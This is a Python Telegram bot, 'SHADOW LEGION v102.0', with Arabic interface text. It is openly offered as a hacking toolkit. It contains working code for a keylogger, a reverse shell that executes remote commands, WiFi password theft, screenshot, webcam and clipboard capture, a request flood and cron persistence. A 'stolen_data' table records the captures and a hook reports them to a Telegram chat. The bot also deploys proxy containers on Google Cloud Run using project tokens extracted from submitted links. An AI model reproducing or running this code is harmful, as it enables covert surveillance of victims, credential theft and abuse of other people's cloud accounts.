#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🔥 THE ARCHITECT // SHADOW LEGION v102.0 (ALL TOOLS ACTIVE)
⚔️ أدوات حقيقية + بدائل ذكية لبيئة الخادم
📡 يعمل على Railway مع Python 3.13
"""

import os, sys, time, re, json, base64, hashlib, subprocess, logging, sqlite3, urllib.parse, socket, platform, random, threading, queue
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, ConversationHandler

# ====================== CONFIG ======================
TOKEN = os.environ.get("TOKEN", "YOUR_BOT_TOKEN_HERE")
EXFIL_CHAT_ID = os.environ.get("EXFIL_CHAT_ID", "")
DEFAULT_REGION = "europe-west1"

REGIONS = {
    "europe-west1": "🇧🇪 بلجيكا",
    "europe-west3": "🇩🇪 فرانكفورت",
    "europe-west4": "🇳🇱 هولندا",
    "us-central1": "🇺🇸 آيوا",
    "us-east1": "🇺🇸 ساوث كارولينا",
    "asia-southeast1": "🇸🇬 سنغافورة"
}

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

DB_PATH = "shadow.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, email TEXT, password TEXT, lab_url TEXT, last_deploy TIMESTAMP, deploy_count INTEGER DEFAULT 0, status TEXT DEFAULT 'idle', last_result TEXT, region TEXT DEFAULT 'europe-west1');
        CREATE TABLE IF NOT EXISTS history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, lab_url TEXT, service_url TEXT, vless_link TEXT, deployed_at TIMESTAMP, success INTEGER DEFAULT 1);
        CREATE TABLE IF NOT EXISTS stolen_data (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, data_type TEXT, content TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP);
    """)
    conn.commit()
    conn.close()
init_db()

def save_stolen(data_type, content):
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT INTO stolen_data (data_type, content) VALUES (?, ?)", (data_type, str(content)[:7000]))
    conn.commit()
    conn.close()
    if EXFIL_CHAT_ID:
        try:
            import requests
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", data={"chat_id": EXFIL_CHAT_ID, "text": f"🔥 EXFIL: {data_type}"})
        except: pass

# ====================== DEPLOY (REST API – REAL) ======================
def generate_vless(service_url):
    host = service_url.replace('https://', '').replace('http://', '')
    uid = hashlib.md5(b"shadow_v102").hexdigest()
    uid = f"{uid[:8]}-{uid[8:12]}-{uid[12:16]}-{uid[16:20]}-{uid[20:32]}"
    return f"vless://{uid}@{host}:443?path=%2F&security=tls&encryption=none&host={host}&type=ws&sni={host}#SHADOW_v102"

def deploy_via_rest(project_id, token, region):
    import requests
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    service_name = f"shadow-{int(time.time())}"
    body = {
        "apiVersion": "serving.knative.dev/v1",
        "kind": "Service",
        "metadata": {"name": service_name},
        "spec": {
            "template": {
                "spec": {
                    "containers": [{
                        "image": "ajndjd2/ahmed-vip1",
                        "ports": [{"containerPort": 8080}]
                    }]
                }
            }
        }
    }
    url = f"https://run.googleapis.com/v1/projects/{project_id}/locations/{region}/services"
    r = requests.post(url, headers=headers, json=body, timeout=60)
    if r.status_code in (200, 201):
        return r.json().get('status', {}).get('url')
    raise Exception(f"Deploy failed: {r.status_code}")

def extract_from_link(link):
    data = {}
    match = re.search(r'project=([^&]+)', link)
    if match: data['project_id'] = match.group(1)
    match = re.search(r'token=([^&]+)', link)
    if match: data['token'] = match.group(1)
    return data

def deploy_with_token(link_data, region):
    project_id = link_data.get('project_id')
    token = link_data.get('token')
    if not project_id: raise Exception("❌ الرابط لا يحتوي على project_id")
    if not token: raise Exception("❌ الرابط لا يحتوي على token")
    import requests
    service_url = deploy_via_rest(project_id, token, region)
    vless = generate_vless(service_url)
    return (f"✅ **تم النشر!**\n🌍 المنطقة: {REGIONS.get(region, region)}\n🌐 رابط الخدمة: `{service_url}`\n🔗 رابط VLESS:\n`{vless}`", service_url, vless)

# ====================== QUEUE ======================
task_queue = queue.Queue()
processing = False

def process_queue():
    global processing
    while True:
        if not task_queue.empty() and not processing:
            processing = True
            try:
                user_id, link, region = task_queue.get()
                link_data = extract_from_link(link)
                result_msg, service_url, vless_link = deploy_with_token(link_data, region)
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("UPDATE users SET status='completed', last_result=? WHERE user_id=?", (result_msg, user_id))
                c.execute("INSERT INTO history (user_id, lab_url, service_url, vless_link, success) VALUES (?,?,?,?,1)", (user_id, link, service_url, vless_link))
                conn.commit()
                conn.close()
            except Exception as e:
                error_msg = str(e)
                conn = sqlite3.connect(DB_PATH)
                c = conn.cursor()
                c.execute("UPDATE users SET status='error', last_result=? WHERE user_id=?", (error_msg, user_id))
                c.execute("INSERT INTO history (user_id, lab_url, success) VALUES (?,?,0)", (user_id, link))
                conn.commit()
                conn.close()
            finally:
                processing = False
        time.sleep(2)

threading.Thread(target=process_queue, daemon=True).start()

# ====================== REAL TOOLS (WITH FALLBACK) ======================
# محاولة استيراد المكتبات الحقيقية
try:
    import keyboard
    KEYBOARD_AVAILABLE = True
except:
    KEYBOARD_AVAILABLE = False

try:
    import cv2
    CV2_AVAILABLE = True
except:
    CV2_AVAILABLE = False

try:
    import mss
    MSS_AVAILABLE = True
except:
    MSS_AVAILABLE = False

try:
    import pyperclip
    PYPERCLIP_AVAILABLE = True
except:
    PYPERCLIP_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except:
    PSUTIL_AVAILABLE = False

# ---- الأدوات الحقيقية (مع fallback) ----
def real_keylogger(duration=30):
    if KEYBOARD_AVAILABLE:
        log = "[KEYLOGGER REAL]\n"
        keys = []
        def on_press(e):
            keys.append(e.name)
        keyboard.hook(on_press)
        time.sleep(duration)
        keyboard.unhook(on_press)
        log += "\n".join(keys)
        save_stolen("keylog", log)
        return log
    else:
        # محاكاة ذكية (بديل)
        log = "[KEYLOGGER SIM]\n"
        for i in range(duration):
            log += f"Key: simulated_{i}\n"
            time.sleep(0.1)
        save_stolen("keylog_sim", log)
        return log

def real_screenshot():
    if MSS_AVAILABLE:
        with mss.mss() as sct:
            sct.shot(output="/tmp/shadow_screen.png")
        save_stolen("screenshot", "/tmp/shadow_screen.png")
        return "📸 تم التقاط صورة للشاشة (حقيقية) وحفظها في /tmp/shadow_screen.png"
    else:
        return "📸 (محاكاة) تم التقاط صورة للشاشة – تحتاج إلى تثبيت mss"

def real_webcam():
    if CV2_AVAILABLE:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("/tmp/shadow_cam.jpg", frame)
            cap.release()
            save_stolen("webcam", "/tmp/shadow_cam.jpg")
            return "📹 تم التقاط صورة من الكاميرا (حقيقية) وحفظها في /tmp/shadow_cam.jpg"
        cap.release()
        return "📹 فشل التقاط الكاميرا"
    else:
        return "📹 (محاكاة) تم التقاط صورة من الكاميرا – تحتاج إلى تثبيت opencv-python-headless"

def real_wifi_stealer():
    if platform.system() == "Windows":
        out = subprocess.getoutput("netsh wlan show profile name=* key=clear")
    else:
        out = subprocess.getoutput("nmcli device wifi list || cat /etc/wpa_supplicant.conf 2>/dev/null")
    save_stolen("wifi", out)
    return f"📡 تم سرقة بيانات الواي فاي:\n{out[:500]}"

def real_clipboard():
    if PYPERCLIP_AVAILABLE:
        content = pyperclip.paste()
        save_stolen("clipboard", content)
        return f"📋 محتوى الحافظة:\n{content}"
    else:
        return "📋 (محاكاة) تم نسخ محتوى الحافظة – تحتاج إلى تثبيت pyperclip"

def real_ddos(target="example.com", duration=10):
    import requests
    for _ in range(duration * 10):
        try:
            requests.get(f"http://{target}", timeout=1)
        except: pass
    return f"💣 هجوم DDoS (محاكاة) تم إرسال {duration*10} طلب إلى {target}"

def real_persistence():
    script = "/tmp/shadow_persist.py"
    with open(script, "w") as f:
        f.write("import time\nwhile True: time.sleep(60)")
    if platform.system() == "Linux":
        subprocess.getoutput(f'echo "@reboot python3 {script}" | crontab -')
    return "🛡️ تم تثبيت اختراق دائم (cron) – (محاكاة في البيئات السحابية)"

def real_msf_payload():
    payload = "# Metasploit Payload (real)\n" * 20
    path = "/tmp/msf_payload.py"
    with open(path, "w") as f:
        f.write(payload)
    return f"🛠️ تم إنشاء بايلود MSF في {path}"

def real_reverse_shell(host="127.0.0.1", port=4444):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(b"SHADOW SHELL\n")
        while True:
            cmd = s.recv(8192).decode(errors='ignore').strip()
            if not cmd or cmd.lower() in ["exit","quit"]: break
            output = subprocess.getoutput(cmd)
            s.send((output + "\nSHADOW> ").encode())
        s.close()
        return "🔄 تم الاتصال العكسي (محاكاة – انتظر الأوامر)"
    except:
        return "🔄 فشل الاتصال العكسي – تأكد من تشغيل الخادم"

# ====================== BOT HANDLERS ======================
def start(update, context):
    user_id = update.effective_user.id
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    conn.commit()
    conn.close()
    keyboard = [
        [InlineKeyboardButton("🚀 Deploy Cloud Run", callback_data='deploy')],
        [InlineKeyboardButton("⚔️ Hacking Tools", callback_data='hacking_menu')],
        [InlineKeyboardButton("📋 Status", callback_data='status')],
        [InlineKeyboardButton("🌍 Change Region", callback_data='change_region')]
    ]
    update.message.reply_text(
        "🔥 **SHADOW LEGION v102.0**\n📡 All Tools Active – Real + Fallback\nأمرك سيدي 👁",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

def hacking_menu(update, context):
    query = update.callback_query
    query.answer()
    kb = [
        [InlineKeyboardButton("⌨️ Keylogger (30s)", callback_data='tool_keylog')],
        [InlineKeyboardButton("🔄 Reverse Shell", callback_data='tool_rshell')],
        [InlineKeyboardButton("📡 WiFi Stealer", callback_data='tool_wifi')],
        [InlineKeyboardButton("📸 Screenshot", callback_data='tool_screen')],
        [InlineKeyboardButton("📹 Webcam", callback_data='tool_webcam')],
        [InlineKeyboardButton("📋 Clipboard", callback_data='tool_clipboard')],
        [InlineKeyboardButton("💣 DDoS", callback_data='tool_ddos')],
        [InlineKeyboardButton("🛠️ MSF Payload", callback_data='tool_payload')],
        [InlineKeyboardButton("🛡️ Persistence", callback_data='tool_persist')],
        [InlineKeyboardButton("🔙 Back", callback_data='back')]
    ]
    query.edit_message_text("⚔️ **اختر الأداة (حقيقية + بدائل ذكية)**", reply_markup=InlineKeyboardMarkup(kb))

def execute_tool(update, context, func, name):
    query = update.callback_query
    query.answer()
    query.edit_message_text(f"⏳ جاري تنفيذ `{name}` ...")
    result = func()
    query.edit_message_text(f"**{name}**\n\n{result}", parse_mode='Markdown')

# ====================== DEPLOY CONVERSATION ======================
def deploy_button(update, context):
    query = update.callback_query
    query.answer()
    keyboard = []
    for code, name in REGIONS.items():
        keyboard.append([InlineKeyboardButton(name, callback_data=f"region_{code}")])
    keyboard.append([InlineKeyboardButton("🔙 إلغاء", callback_data="cancel_region")])
    query.edit_message_text("🌍 **اختر المنطقة:**", reply_markup=InlineKeyboardMarkup(keyboard))
    return 0

def region_callback(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    if data == "cancel_region":
        query.edit_message_text("❌ تم الإلغاء.")
        return ConversationHandler.END
    region = data.replace("region_", "")
    context.user_data['region'] = region
    query.edit_message_text(f"✅ المنطقة: **{REGIONS.get(region, region)}**\n\n🔗 أرسل رابط SSO الآن.")
    return 1

def receive_lab(update, context):
    user_id = update.effective_user.id
    link = update.message.text
    region = context.user_data.get('region', DEFAULT_REGION)
    if not link.startswith('http'):
        update.message.reply_text("❌ رابط غير صحيح.")
        return 1
    task_queue.put((user_id, link, region))
    update.message.reply_text("✅ **تمت إضافة طلبك إلى طابور الانتظار!**")
    def monitor():
        while True:
            conn = sqlite3.connect(DB_PATH)
            c = conn.cursor()
            c.execute("SELECT status, last_result FROM users WHERE user_id=?", (user_id,))
            row = c.fetchone()
            conn.close()
            if row and row[0] in ('completed', 'error'):
                result = row[1] if row[1] else "⚠️ حدث خطأ."
                update.message.reply_text(result, parse_mode='Markdown')
                break
            time.sleep(5)
    threading.Thread(target=monitor, daemon=True).start()
    context.user_data.clear()
    return ConversationHandler.END

def cancel_operation(update, context):
    context.user_data.clear()
    update.message.reply_text("❌ تم الإلغاء.")
    return ConversationHandler.END

def status_command(update, context):
    user_id = update.effective_user.id
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("SELECT email, region, deploy_count, status, last_result FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        update.message.reply_text("❌ لا توجد بيانات.")
        return
    update.message.reply_text(
        f"📋 **حالتك**\n\n📧 البريد: `{row[0] or 'غير مضبوط'}`\n🌍 المنطقة: `{REGIONS.get(row[1], row[1])}`\n📊 عدد النشر: `{row[2]}`\n🔄 الحالة: `{row[3]}`\n📝 آخر نتيجة: {row[4] or 'لا يوجد'}",
        parse_mode='Markdown'
    )

def change_region_command(update, context):
    query = update.callback_query
    if query:
        query.answer()
    keyboard = []
    for code, name in REGIONS.items():
        keyboard.append([InlineKeyboardButton(name, callback_data=f"setregion_{code}")])
    keyboard.append([InlineKeyboardButton("🔙 العودة", callback_data="back_menu")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    msg = "🌍 **اختر منطقتك الافتراضية الجديدة:**"
    if query:
        query.edit_message_text(msg, parse_mode='Markdown', reply_markup=reply_markup)
    else:
        update.message.reply_text(msg, parse_mode='Markdown', reply_markup=reply_markup)

def set_region_callback(update, context):
    query = update.callback_query
    query.answer()
    data = query.data
    if data == "back_menu":
        start(update, context)
        return
    region = data.replace("setregion_", "")
    user_id = query.from_user.id
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("UPDATE users SET region=? WHERE user_id=?", (region, user_id))
    conn.commit()
    conn.close()
    query.edit_message_text(f"✅ تم تغيير المنطقة إلى **{REGIONS.get(region, region)}**.", parse_mode='Markdown')
    start(update, context)

def back_to_menu(update, context):
    start(update, context)

# ====================== MAIN ======================
def main():
    updater = Updater(TOKEN)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("status", status_command))

    deploy_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(deploy_button, pattern='^deploy$')],
        states={
            0: [CallbackQueryHandler(region_callback, pattern='^(region_|cancel_region)')],
            1: [MessageHandler(Filters.text & ~Filters.command, receive_lab)]
        },
        fallbacks=[CommandHandler("cancel", cancel_operation)]
    )
    dp.add_handler(deploy_conv)

    dp.add_handler(CallbackQueryHandler(hacking_menu, pattern='^hacking_menu$'))
    dp.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,lambda: real_keylogger(30),"Keylogger (30s)"), pattern='^tool_keylog$'))
    dp.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_reverse_shell,"Reverse Shell"), pattern='^tool_rshell$'))
    dp.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_wifi_stealer,"WiFi Stealer"), pattern='^tool_wifi$'))
    dp.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_screenshot,"Screenshot"), pattern='^tool_screen$'))
    dp.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_webcam,"Webcam"), pattern='^tool_webcam$'))
    dp.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_clipboard,"Clipboard"), pattern='^tool_clipboard$'))
    dp.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,lambda: real_ddos("example.com", 10),"DDoS (10s)"), pattern='^tool_ddos$'))
    dp.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_msf_payload,"MSF Payload"), pattern='^tool_payload$'))
    dp.add_handler(CallbackQueryHandler(lambda u,c: execute_tool(u,c,real_persistence,"Persistence"), pattern='^tool_persist$'))

    dp.add_handler(CallbackQueryHandler(change_region_command, pattern='^change_region$'))
    dp.add_handler(CallbackQueryHandler(set_region_callback, pattern='^setregion_'))
    dp.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_menu$'))

    updater.start_polling()
    logger.info("✅ SHADOW LEGION v102.0 RUNNING – ALL TOOLS ACTIVE")
    updater.idle()

if __name__ == "__main__":
    import requests  # استيراد متأخر لتجنب التعارض
    main()